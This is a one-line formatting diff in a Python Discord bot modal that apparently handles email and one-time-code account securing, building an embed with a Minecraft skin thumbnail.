@@ -54,7 +54,7 @@ class MyModalTwo(ui.Modal):
                     description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid OTP Code```",
                     timestamp = datetime.datetime.now(),
                     colour = 0xFF5C5C                  
-                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username}"),
+                ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}"),
                 view = ButtonOptions(interaction.user)
             )
 
